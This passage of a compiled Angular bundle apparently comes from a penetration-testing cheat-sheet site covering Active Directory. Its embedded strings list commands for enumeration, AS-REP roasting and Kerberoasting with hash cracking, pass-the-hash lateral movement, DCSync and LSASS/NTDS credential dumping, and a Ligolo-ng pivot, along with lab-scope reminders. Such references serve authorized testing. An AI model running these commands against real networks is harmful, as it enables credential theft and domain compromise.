# - Unattended installation files
# - Accessible shares and backup files
#
# Treat passwords, hashes, tickets and secret material as sensitive.
# Do not export or retain credentials outside the approved lab scope.
`;flowKerberosAudit=`
# Enumerate SPNs registered to a domain user
setspn -L USER

# Find domain users with registered SPNs using PowerView
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# Review the current Kerberos ticket cache
klist

# Review delegation and privileged-account exposure.
# Use approved directory auditing tools to inspect:
# - Unconstrained delegation
# - Constrained delegation
# - Resource-based constrained delegation
# - Privileged group membership
# - Replication-related directory permissions
`;flowMssqlAudit=`
# MSSQL security assessment checklist
#
# 1. Identify reachable SQL Server instances.
# 2. Verify which account is used for authentication.
# 3. Review server roles and database permissions.
# 4. Check whether the account has excessive privileges.
# 5. Review linked servers and delegation configuration.
# 6. Check whether dangerous features are enabled unnecessarily.
# 7. Document evidence and recommended remediation.
#
# Perform testing only against explicitly authorized instances.
`;flowPivotEnumeration=`
# On the Windows pivot host
ipconfig /all
route print

# Identify the network interfaces and reachable subnets.
# Record the pivot host IP and the target subnet before
# configuring the tunnel.
`;flowLigolo=`
# Start the Ligolo-ng proxy on the authorized testing machine
sudo ./proxy -selfcert

# Start the Ligolo-ng agent on the authorized pivot host
# Use the proxy address and port configured for your lab.
# Example agent invocation:
./agent -connect PROXY_IP:11601 -ignore-cert

# After the agent connects:
# 1. Select the correct session in the proxy.
# 2. Start the tunnel.
# 3. Configure the route to the lab subnet.
# 4. Verify reachability before scanning.
#
# Consult the Ligolo-ng documentation for your platform
# and the exact route configuration required by your lab.
`;flowPostPivot=`
# Scan a newly reachable lab host
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN pivotPorts

# Enumerate discovered services
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN pivotServices

# Reassess each host
# - Identify the operating system and exposed services.
# - Enumerate domain membership and available shares.
# - Validate access using approved lab credentials.
# - Review SQL Server and other application services.
# - Update the network map and document findings.
#
# Do not assume that credentials valid on one host
# should be reused on another without authorization.
`;linuxAdInitialScan=String.raw`# Full TCP port scan; save open ports for the follow-up command
  nmap -p- --min-rate 5000 -T4 <IP> -oN openPorts

# Service and version detection
nmap -sCV -p <ports> <IP>

# Parse openPorts and scan discovered services
nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) <IP> -oN services

# Important AD ports
# 88   Kerberos
# 389  LDAP
# 445  SMB
# 5985 WinRM
# 3268 Global Catalog`;linuxAdNoCredentials=String.raw`# RPC enumeration
rpcclient -U "" -N <IP>
# Inside rpcclient:
enumdomusers
querydispinfo

# SMB anonymous enumeration
smbclient -L //<IP> -N
smbclient //<IP>/<Share> -N
crackmapexec smb <IP> --shares -u '' -p ''
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
enum4linux -a <IP>
enum4linux -u 'domain.com\\guest' -a <IP>
smbmap -u anonymous -H <IP>

# LDAP anonymous: discover Base DN
ldapsearch -x -H ldap://<IP> -s base

# Anonymous LDAP enumeration
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com"

# Extract domain usernames
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" -s sub "(&(objectClass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Search user descriptions and other attributes for exposed credentials
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" "(objectClass=user)" description

# Authenticated LDAP query
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com"

# Enumerate computer objects and check readable LAPS attributes
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName ms-Mcs-AdmPwd

# Kerberos username enumeration
kerbrute userenum -d corp.com users.txt --dc <IP>

# AS-REP roasting
impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip <IP>

# Crack AS-REP hashes
hashcat -m 18200 hashes.txt rockyou.txt

# DNS zone transfer
dig axfr corp.com @<IP>`;linuxAdWithCredentials=String.raw`# Validate credentials
crackmapexec smb <IP> -u user -p '<PASSWORD>' -d corp.com

# Password policy
crackmapexec smb <IP> -u user -p '<PASSWORD>' --pass-pol

# Check whether any listed account accepts an empty password
nxc smb <IP> -u users.txt -p '' --continue-on-success

# Change an expired or must-change password when authorized
impacket-changepasswd domain/user@<DC_IP> -newpass '<NEW_PASSWORD>'

# Enumerate SMB shares
crackmapexec smb <IP> -u user -p '<PASSWORD>' --shares

# Enumerate domain SIDs and users
impacket-lookupsid domain/user:'<PASSWORD>'@<IP>
impacket-lookupsid domain.local/ -no-pass
impacket-lookupsid domain.local/guest@<IP> -no-pass
impacket-lookupsid anonymous@<IP>

# Access SYSVOL
smbclient //dc1/SYSVOL -U 'domain.htb/user%<PASSWORD>'
smbclient //dc1/SYSVOL -U user -c "recurse ON; prompt OFF; ls"

# Access shares
smbclient //<IP>/<Share> -U 'user%<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>' -r <Share>

# Enumerate domain users
impacket-GetADUsers corp.com/user:'<PASSWORD>' -dc-ip <IP>

# Enumerate computer objects
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName operatingSystem

# Kerberoasting
impacket-GetUserSPNs corp.com/user:'<PASSWORD>' -dc-ip <IP> -request

# Crack Kerberoast hashes
hashcat -m 13100 hashes.txt rockyou.txt

# BloodHound collection
bloodhound-python -u user -p '<PASSWORD>' -d corp.com -dc dc1.corp.com -c all

# Check local administrator access across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com --local-auth

# Enumerate active SMB sessions
crackmapexec smb <IP> -u user -p '<PASSWORD>' --sessions`;linuxAdLateralMovement=String.raw`# WinRM - password
evil-winrm -i <IP> -u user -p '<PASSWORD>'

# WinRM - domain formats
evil-winrm -i <IP> -u 'corp\\user' -p '<PASSWORD>'
evil-winrm -i <IP> -u user@corp.com -p '<PASSWORD>'

# WinRM - Pass the Hash
evil-winrm -i <IP> -u user -H <NTLM_HASH>

# WMI execution
impacket-wmiexec corp.com/user:'<PASSWORD>'@<IP>
impacket-wmiexec user:'<PASSWORD>'@<IP>

# PsExec - requires administrative access
impacket-psexec corp.com/user:'<PASSWORD>'@<IP>
impacket-psexec user:'<PASSWORD>'@<IP>

# Pass the Hash with WMI
impacket-wmiexec -hashes :<NTLM_HASH> user@<IP>

# Pass the Hash with PsExec
impacket-psexec -hashes :<NTLM_HASH> Administrator@<IP>

# Validate an NTLM hash
crackmapexec smb <IP> -u user -H <NTLM_HASH>

# Validate credentials across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com

# Decision guide
# 5985/5986 open + authorized user -> WinRM
# SMB + local admin privileges -> PsExec
# WinRM unavailable, SMB available -> consider WMI
# NTLM hash available -> test authorized Pass-the-Hash options`;linuxAdCredentialDumping=String.raw`# Remote credential dumping - requires sufficient privileges
impacket-secretsdump corp.com/user:'<PASSWORD>'@<IP>

# Extract local SAM hashes from collected hives
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Extract NTDS hashes from collected files
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Extract LSA secrets from collected hives
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL

# NetExec: SAM
nxc smb <IP> -u user -p '<PASSWORD>' --sam

# NetExec: LSA secrets
nxc smb <IP> -u user -p '<PASSWORD>' --lsa

# NetExec: LSASS
nxc smb <IP> -u user -p '<PASSWORD>' -M lsassy

# NetExec: NTDS - requires replication privileges
nxc smb <DC_IP> -u user -p '<PASSWORD>' --ntds

# NetExec: LAPS - requires permission to read the relevant attributes
nxc smb <IP> -u user -p '<PASSWORD>' -M laps

# NetExec: gMSA - requires appropriate directory permissions
nxc ldap <DC_IP> -u user -p '<PASSWORD>' --gmsa

# NetExec: enumerate sessions and logged-on users
nxc smb <IP> -u user -p '<PASSWORD>' --sessions
nxc smb <IP> -u user -p '<PASSWORD>' --loggedon-users

# Search accessible shares for interesting files
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus

# Download files discovered by spider_plus
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True

# Crack cached domain credentials where applicable
john --wordlist=rockyou.txt --format=mscash2 hash.txt

# DCSync - requires domain replication rights
impacket-secretsdump -just-dc-user administrator corp.com/user:'<PASSWORD>'@<DC_IP>
impacket-secretsdump -just-dc corp.com/user:'<PASSWORD>'@<DC_IP>

# Offline analysis of an LSASS dump
pypykatz lsa minidump lsass.dmp

# Search common locations for stored credentials on an authorized Windows host
# PowerShell history:
# %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
#
# Common files:
# *.config, *.xml, *.ini, *.txt, web.config, Unattend.xml, sysprep.xml
#
# Group Policy Preferences:
# Search SYSVOL XML files for the cpassword attribute
#
# Credential Manager:
# cmdkey /list
# vaultcmd /list`;static \u0275fac=function(t){return new(t||s)};static \u0275cmp=g({type:s,selectors:[["app-active-directory"]],decls:27,vars:15,consts:[[1,"common-services-page","active-directory-page"],[1,"page-header"],[1,"terminal-path"],[1,"prompt"],[1,"title"],[1,"page-description"],[1,"section-workspace"],[1,"section-workspace__index",3,"sectionChange","items","activeId"],[1,"section-workspace__content"],[1,"detail"],[4,"ngIf"],[1,"section-description"],[3,"command"],["multi",""]],template:function(t,p){t&1&&(n(0,"div",0)(1,"div",1)(2,"div",2)(3,"span",3),a(4,"~/get.sh/"),e(),a(5,"active-directory "),e(),n(6,"h1",4),a(7,"Active Directory"),e(),n(8,"p",5),a(9," Domain enumeration, object permissions, sessions and relationship analysis for Active Directory assessments. "),e()(),n(10,"div",6)(11,"app-section-index",7),v("sectionChange",function(D){return p.selectService(D)}),e(),n(12,"div",8)(13,"div",9),x(14,I,15,2,"ng-container",10)(15,R,20,3,"ng-container",10)(16,L,20,3,"ng-container",10)(17,N,20,3,"ng-container",10)(18,W,25,4,"ng-container",10)(19,T,20,3,"ng-container",10)(20,H,38,7,"ng-container",10)(21,z,49,8,"ng-container",10)(22,G,30,5,"ng-container",10)(23,U,30,5,"ng-container",10)(24,j,20,3,"ng-container",10)(25,V,53,20,"ng-container",10)(26,q,31,5,"ng-container",10),e()()()()),t&2&&(i(11),o("items",p.sections)("activeId",p.selectedService??""),i(3),o("ngIf",p.selectedService==="windows"),i(),o("ngIf",p.selectedService==="powerview"),i(),o("ngIf",p.selectedService==="manual"),i(),o("ngIf",p.selectedService==="spn"),i(),o("ngIf",p.selectedService==="acl"),i(),o("ngIf",p.selectedService==="shares"),i(),o("ngIf",p.selectedService==="bloodhound"),i(),o("ngIf",p.selectedService==="credentials"),i(),o("ngIf",p.selectedService==="kerberos"),i(),o("ngIf",p.selectedService==="passwords"),i(),o("ngIf",p.selectedService==="compromise"),i(),o("ngIf",p.selectedService==="ad-flow"),i(),o("ngIf",p.selectedService==="full-ad-compromise-linux"))},dependencies:[y,S,k,E,f,C,w,O,_],styles:[".common-services-page.active-directory-page[_ngcontent-%COMP%]{padding:2rem;color:#e2e8f0;max-width:1200px;margin:0 auto;box-sizing:border-box}.active-directory-page[_ngcontent-%COMP%]   .page-header[_ngcontent-%COMP%]{margin-bottom:2rem}.active-directory-page[_ngcontent-%COMP%]   .terminal-path[_ngcontent-%COMP%]{margin-bottom:.5rem;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;color:#64748b}.active-directory-page[_ngcontent-%COMP%]   .terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#38bdf8}.active-directory-page[_ngcontent-%COMP%]   .title[_ngcontent-%COMP%]{font-size:30px;font-weight:700;margin:0 0 .5rem;color:#f8fafc}.active-directory-page[_ngcontent-%COMP%]   .page-description[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:14px;line-height:1.6;max-width:760px}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]{display:flex!important;align-items:center!important;gap:1rem!important;width:100%!important;margin:2.5rem 0 1.5rem!important;box-sizing:border-box!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{display:block!important;flex:0 0 auto!important;margin:0!important;padding:0!important;color:#e2e8f0!important;font-family:inherit!important;font-size:.85rem!important;font-weight:600!important;line-height:1.5!important;letter-spacing:.12em!important;text-transform:uppercase!important;white-space:nowrap!important;background:transparent!important;border:none!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   .section-line[_ngcontent-%COMP%]{display:block!important;flex:1 1 0!important;min-width:0!important;height:1px!important;padding:0!important;background:#1e293b!important;border:none!important;opacity:1!important}.active-directory-page[_ngcontent-%COMP%]   .grid[_ngcontent-%COMP%]{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1rem}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]{display:flex;align-items:flex-start;gap:1rem;height:100%;min-height:130px;padding:1.25rem;box-sizing:border-box;background:#111827;border:1px solid #1e293b;border-radius:12px;cursor:pointer;transition:transform .2s ease,border-color .2s ease,background .2s ease,box-shadow .2s ease}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover{transform:translateY(-4px);border-color:#2563eb;background:#172033;box-shadow:0 8px 25px #00000040,0 0 15px #2563eb14}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:focus-visible{outline:2px solid #38bdf8;outline-offset:3px}.active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%]{flex-shrink:0;width:46px;height:46px;display:flex;align-items:center;justify-content:center;box-sizing:border-box;border-radius:10px;background:#0b1220;border:1px solid #1e3a5f;color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:16px;font-weight:700;transition:border-color .2s ease,color .2s ease,background .2s ease}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover   .card-icon[_ngcontent-%COMP%]{border-color:#2563eb;color:#60a5fa;background:#0f172a}.active-directory-page[_ngcontent-%COMP%]   .card-content[_ngcontent-%COMP%]{min-width:0}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .45rem;color:#f8fafc;font-size:17px;font-weight:650;line-height:1.4}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:13px;line-height:1.6}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:1rem;min-width:0}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;font-size:30px;font-weight:700;line-height:1.3;color:#f8fafc}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]{margin:-.5rem 0 1rem;color:#94a3b8;font-size:14px;line-height:1.7;max-width:900px}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]   code[_ngcontent-%COMP%]{color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]{display:inline-flex;align-items:center;gap:.5rem;width:fit-content;max-width:100%;padding:9px 13px;background:transparent;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:13px;font-family:inherit;cursor:pointer;transition:background .2s ease,border-color .2s ease,color .2s ease}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]:hover{background:#1e293b;border-color:#3b82f6;color:#60a5fa}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]:focus-visible{outline:2px solid #38bdf8;outline-offset:3px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel[_ngcontent-%COMP%]{background:#1e293b!important;color:#e2e8f0!important;border-radius:10px!important;margin-bottom:10px;border:1px solid #334155;box-shadow:none!important;overflow:hidden}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{color:#e2e8f0!important;background:transparent!important;min-height:52px;padding:0 16px;transition:background .2s ease}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#243449!important}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{color:#e2e8f0!important;font-size:14px;font-weight:600;line-height:1.5}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]   .mat-expansion-indicator[_ngcontent-%COMP%]:after{color:#38bdf8}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-body[_ngcontent-%COMP%]{padding:0 16px 16px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]{position:relative;max-width:100%;box-sizing:border-box;background:#080d14;color:#38bdf8;padding:16px 18px 16px 24px;border-radius:8px;border:1px solid #1e293b;overflow-x:auto;overflow-y:hidden;margin:1rem 0 0;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;line-height:1.7;tab-size:2;white-space:pre;box-shadow:inset 0 0 20px #00000040}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]   code[_ngcontent-%COMP%]{color:#38bdf8;font-family:inherit;font-size:inherit;line-height:inherit}.active-directory-page[_ngcontent-%COMP%]     .terminal-comment{color:#aebdc2!important;opacity:1!important;font-style:normal;font-weight:500}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar{height:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-track{background:#0b1220;border-radius:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-thumb{background:#334155;border-radius:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-thumb:hover{background:#475569}@media(max-width:768px){.common-services-page.active-directory-page[_ngcontent-%COMP%]{padding:1rem}.active-directory-page[_ngcontent-%COMP%]   .title[_ngcontent-%COMP%]{font-size:24px}.active-directory-page[_ngcontent-%COMP%]   .grid[_ngcontent-%COMP%]{grid-template-columns:1fr}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]{min-height:110px;padding:1rem}.active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%]{width:42px;height:42px}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:26px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{padding:0 12px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-body[_ngcontent-%COMP%]{padding:0 12px 12px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]{padding:14px;font-size:12px}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]{gap:.75rem!important;margin:2rem 0 1.25rem!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:.75rem!important}}@media(prefers-reduced-motion:reduce){.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{transition:none}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover{transform:none}}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]{margin-bottom:1.5rem;color:#94a3b8;font-size:.9rem;line-height:1.7}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel[_ngcontent-%COMP%]{margin-bottom:.85rem;overflow:hidden;background:#0b1220!important;border:1px solid #1e293b;border-radius:10px!important;box-shadow:none!important}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{min-height:56px;padding:0 1.25rem;background:#111827;transition:background .2s ease}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#172235!important}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{color:#7fffd4;font-size:.9rem;font-weight:600;letter-spacing:.01em}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]   .mat-expansion-indicator[_ngcontent-%COMP%]:after{color:#67e8f9}.active-directory-page[_ngcontent-%COMP%]   .mat-expansion-panel-body[_ngcontent-%COMP%]{padding:1rem 1.25rem 1.25rem;background:#0b1220}.active-directory-page[_ngcontent-%COMP%]   app-terminal[_ngcontent-%COMP%]{display:block;min-width:0;margin-top:.75rem}.active-directory-page[_ngcontent-%COMP%]   app-terminal[_ngcontent-%COMP%]:first-child{margin-top:0}@media(max-width:768px){.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{min-height:52px;padding:0 .9rem}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{font-size:.8rem}.active-directory-page[_ngcontent-%COMP%]   .mat-expansion-panel-body[_ngcontent-%COMP%]{padding:.85rem}}@media(prefers-reduced-motion:reduce){.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{transition:none}}"]})};export{A as ActiveDirectory};
